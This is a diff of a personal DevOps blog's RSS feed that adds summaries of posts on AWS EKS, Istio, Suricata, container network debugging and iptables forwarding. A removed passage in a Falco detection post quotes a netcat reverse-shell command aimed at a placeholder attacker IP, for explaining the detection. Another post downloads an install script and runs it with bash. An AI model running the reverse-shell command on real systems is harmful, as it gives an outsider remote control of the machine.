@@ -6,7 +6,106 @@
     <description>Recent content on Xiao.chen</description>
     <generator>Hugo -- gohugo.io</generator>
     <copyright>Copyright © 2008–2020, Xiao.chen; all rights reserved.</copyright>
-    <lastBuildDate>Sat, 10 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wisekee.com/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 20 Feb 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wisekee.com/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>AWS EKS use farget nodes as pod runtime environments</title>
+      <link>https://blog.wisekee.com/post/aws-eks-farget-nodes/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-eks-farget-nodes/</guid>
+      <description>
+        
+          
+            For greater isolation and convenience, we can use farget as the run time environment for eks.
+Create eks farget execute role named: AmazonEKSFargatePodExecutionRole the TrustPolicy statements like following 1# trust policy 2{ 3 &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;, 4 &amp;#34;Statement&amp;#34;: [ 5 { 6 &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;, 7 &amp;#34;Principal&amp;#34;: { 8 &amp;#34;Service&amp;#34;: [ 9 &amp;#34;ssm.amazonaws.com&amp;#34;, 10 &amp;#34;eks-fargate-pods.amazonaws.com&amp;#34; 11 ] 12 }, 13 &amp;#34;Action&amp;#34;: &amp;#34;sts:AssumeRole&amp;#34;, 14 &amp;#34;Condition&amp;#34;: { 15 &amp;#34;ArnLike&amp;#34;: { 16 &amp;#34;aws:SourceArn&amp;#34;: &amp;#34;arn:aws:eks:us-east-1:{accountId}:fargateprofile/{clusterName}/*&amp;#34; 17 } 18 } 19 } 20 ] 21} attach the AWS managed policy to farget execution Role AmazonEKSClusterPolicy AmazonEKSFargatePodExecutionRolePolicy Create EKS farget profile in eks console select eks cluster and navigate the compute tab.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>EKS nodes speed workloads launch time use placeholde free one node</title>
+      <link>https://blog.wisekee.com/post/aws-eks-placeholde-nodes/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-eks-placeholde-nodes/</guid>
+      <description>
+        
+          
+            Create eks node group label and taint 1labels = { 2 &amp;#34;node-group&amp;#34; : &amp;#34;spotInstances&amp;#34; 3} 4taints = [ 5 { 6 effect = &amp;#34;NO_SCHEDULE&amp;#34; 7 key = &amp;#34;devops&amp;#34; 8 value = &amp;#34;cicdScan&amp;#34; 9 } 10] Create priorityClass one to placeholder other one to nornal schedule 1apiVersion: scheduling.k8s.io/v1 2kind: PriorityClass 3metadata: 4 name: placeholder 5value: 0 6preemptionPolicy: Never 7globalDefault: false 8description: &amp;#39;placeholder&amp;#39; 9--- 10apiVersion: scheduling.k8s.io/v1 11kind: PriorityClass 12metadata: 13 name: normal 14value: 1 15preemptionPolicy: Never 16globalDefault: true # default 17description: &amp;#39;normal&amp;#39; Use placeholde deployment 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: placeholder 5spec: 6 replicas: 1 # how many placeholder node should launch 7 selector: 8 matchLabels: 9 app: placeholder 10 template: 11 metadata: 12 labels: 13 app: placeholder 14 spec: 15 terminationGracePeriodSeconds: 0 # important 16 priorityClassName: placeholder # important 17 containers: 18 - image: nginx:1.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Installation and configuration istio use helm chat and terraform</title>
+      <link>https://blog.wisekee.com/post/install_istio_helm_chat/</link>
+      <pubDate>Sat, 18 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/install_istio_helm_chat/</guid>
+      <description>
+        
+          
+            Installation and Configuration istio use terraform
+Pull helm chats to local 1# download latest helm chat packages 2helm pull istio/base 3helm pull istio/istiod 4helm pull istio/gateway 5 6# uncompress to relative directory 7tar -xzvf base-1.17.1.tgz 8tar -xzvf istiod-1.17.1.tgz 9tar -xzvf gateway-1.17.1.tgz 10 11# move the istio components to prefer directory 12mv base ~/code/chats/istio-base 13mv istiod ~/code/chats/istiod 14mv gateway ~/code/chats/istio-gateway Create the istio namespace and initialization the base resources 1resource &amp;#34;kubernetes_namespace&amp;#34; &amp;#34;istio_system&amp;#34; { 2 metadata { 3 annotations = { 4 name = &amp;#34;istio-system&amp;#34; 5 } 6 labels = { 7 &amp;#34;kubesphere.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS traffic security analysis and mirror</title>
+      <link>https://blog.wisekee.com/post/aws-traffic-analysis/</link>
+      <pubDate>Wed, 18 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-traffic-analysis/</guid>
+      <description>
+        
+          
+            install Suricata in ubuntu instance 1sudo add-apt-repository ppa:oisf/suricata-stable 2sudo apt install suricata 3sudo systemctl enable suricata.service 4sudo systemctl stop suricata.service Config Suricata edit file sudo nano /etc/suricata/suricata.yaml
+1# enable/disable the community id feature. 2community-id: true 3# Linux high speed capture support 4af-packet: 5 - interface: eth0 6 # Number of receive threads. &amp;#34;auto&amp;#34; uses the number of cores 7 #threads: auto 8 # Default clusterid. AF_PACKET will load balance packets based on flow.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Debug the docker container network use nsenter command</title>
+      <link>https://blog.wisekee.com/post/docker-nsenter-container-network/</link>
+      <pubDate>Tue, 10 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/docker-nsenter-container-network/</guid>
+      <description>
+        
+          
+            Login in kubernetes node use ssh Find out the container 1#find process id in specific container 2docker top `docker ps|grep &amp;#34;istio-proxy_productpage&amp;#34;|cut -d &amp;#34; &amp;#34; -f1` 3# find the pid and use nsenter to container network namespace 4nsenter -n --target PID 5# View the details of the rule configuration in the NAT table. 6iptables -t nat -L -v 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS vpc flow logs insight</title>
+      <link>https://blog.wisekee.com/post/aws-logs-insight/</link>
+      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-logs-insight/</guid>
+      <description>
+        
+          
+            Define pattern for log groups in cloudwatch Create filter pattern filter pattern: [action, azid, bytes, dstaddr,dstport,instanceid,protocol,srcaddr,srcport,subnetid] Metric namespaces Name for metric namespace Metric name: bytes Metric value: $bytes Unit: Bytes Dimensions: Dimension Name: dst-addr, Dimension Value: $dstaddr Determine NAT gateway logs 1fields @timestamp 2| parse @message &amp;#34;* * * * * * * * * *&amp;#34; as action, azid, bytes, dstaddr,dstport,instanceid,protocol,srcaddr,srcport,subnetid 3| stats sum(bytes) as bytesTransferred by srcaddr, dstaddr 4| sort bytesTransferred desc VPC transit gateway flow logs Create filter pattern [version, resource_type, account_id,tgw_id, tgw_attachment_id, tgw_src_vpc_account_id, tgw_dst_vpc_account_id, tgw_src_vpc_id, tgw_dst_vpc_id, tgw_src_subnet_id, tgw_dst_subnet_id, tgw_src_eni, tgw_dst_eni, tgw_src_az_id, tgw_dst_az_id, tgw_pair_attachment_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,start,end, log_status, type,packets_lost_no_route, packets_lost_blackhole, packets_lost_mtu_exceeded, packets_lost_ttl_expired, tcp_flags,region, flow_direction, pkt_src_aws_service, pkt_dst_aws_service] Metric namespaces Name for metric namespace Metric name: bytes Metric value: $bytes Unit: Bytes Dimensions: Dimension Name: account_id, Dimension Value: $account_id Determine VPC transit gateway logs 1filter @logStream = &amp;#39;tgw-attach-00000-all&amp;#39; 2 | fields @timestamp 3 | parse @message &amp;#34;* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *&amp;#34; as version, resource_type, account_id,tgw_id, tgw_attachment_id, tgw_src_vpc_account_id, tgw_dst_vpc_account_id, tgw_src_vpc_id, tgw_dst_vpc_id, tgw_src_subnet_id, tgw_dst_subnet_id, tgw_src_eni, tgw_dst_eni, tgw_src_az_id, tgw_dst_az_id, tgw_pair_attachment_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,start,end, log_status, type,packets_lost_no_route, packets_lost_blackhole, packets_lost_mtu_exceeded, packets_lost_ttl_expired, tcp_flags,region, flow_direction, pkt_src_aws_service, pkt_dst_aws_service 
+          
+          
+        
+      </description>
+    </item>
+    
     <item>
       <title>Local fast proxy chain access tool</title>
       <link>https://blog.wisekee.com/post/local-proxychain-tools/</link>
@@ -75,6 +174,23 @@ Download Dokcer.dmg in Docker offical site and reinstalling 1 sudo hdiutil attac
     </item>
     
     <item>
+      <title>Forward the traffic to internal server through iptables rule use bastion server</title>
+      <link>https://blog.wisekee.com/post/iptables-forward-traffic/</link>
+      <pubDate>Mon, 18 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/iptables-forward-traffic/</guid>
+      <description>
+        
+          
+            Sometimes we have access internal service or server in local network,needs through external bastion server bridge to.
+1# The traffic forward to internal environment through bastion iptables rule diagram 2 3# local or office ------&amp;gt; bastion machine ----------&amp;gt; internal server 4# local access bastion-public-ip:8888 -----&amp;gt; bastion iptables rules ----&amp;gt; internal server:80 5 6# display iptalbes nat rules 7iptables -t nat -L 8 9# add prepostrouting rule to chain 10iptables -t nat -A PREROUTING -p tcp -m tcp --dport 8899 -j DNAT --to-destination 192.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
       <title>Falco reverse shell detecting</title>
       <link>https://blog.wisekee.com/post/falco-reverse-shell-rules/</link>
       <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
@@ -83,9 +199,8 @@ Download Dokcer.dmg in Docker offical site and reinstalling 1 sudo hdiutil attac
       <description>
         
           
-            Reverse shell tries to circumvent these protections by reversing the roles. It is the target machine that initiates the connection request to the user end.
-for example
-Netcat can be used to both set up a shell listener and initiate reverse shell connections from the victim machine. Here’s a quick example to setup a shell listener: 1nc -l -p 1234 On the victim side, the attacker would initiate the interactive shell connection with the following command: 1nc -e /bin/bash &amp;lt;attacker IP&amp;gt; 1234 Detect with Falco 1- rule: Netcat Remote Code Execution in Container 2 desc: Netcat Program runs inside container that allows remote code execution 3 condition: &amp;gt; 4 spawned_process and container and 5 ((proc.
+            Use install tools this will one site to launch falco
+1curl -o install_falco -s https://falco.org/script/install 2# It should be 59201c1339cc53e86edcd7d2e7273e52f784b3cf7d4a3142059112b3b9062f6d. 3sha256sum install_falco 4sudo bash install_falco Manully install Falco program You can also directly check in Github: falco-rules 1wget https://download.falco.org/packages/bin/x86_64/falco-0.34.1-x86_64.tar.gz 2tar -xzvf falco-0.34.1-x86_64.tar.gz 3apt update -y 4apt install -y dkms make linux-headers-$(uname -r) 5# If you use the falco-driver-loader to build the BPF probe locally you need also clang toolchain 6apt install -y clang llvm 7# can reference the falco site: https://falco.
           
           
         
@@ -742,6 +857,20 @@ Configuration file param.json 1{ 2 &amp;#34;dev&amp;#34;: { 3 &amp;#34;public_co
 1git submodule update --init --recursive Usage scene In my github repo initialize two repos
 One to storage Hugo sourcecode and markdown files And other one use release finaly site resources Has two folders themes and public as github submodes
 1 git submodule add https://github.com/don.chen/blog.github.io public 2 git submodule update --init and every time wited markdown article and execute
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://blog.wisekee.com/post/up_and_running_opentelmetry/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/up_and_running_opentelmetry/</guid>
+      <description>
+        
           
           
         
